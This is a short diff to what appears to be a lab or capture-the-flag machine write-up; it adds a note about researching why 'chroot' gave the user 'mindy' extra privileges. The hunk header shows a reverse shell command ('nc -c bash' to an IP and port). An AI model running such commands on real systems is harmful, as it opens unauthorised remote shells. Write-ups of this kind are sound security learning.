@@ -154,6 +154,7 @@ nc -c bash 10.10.16.6 1234
 
 ## What Did I learn from this Machine?  
 * The ability to telnet should be disabled. 
+* Research the `chroot` thing and why has it given me more privileges than normal mindy.
 
 
  
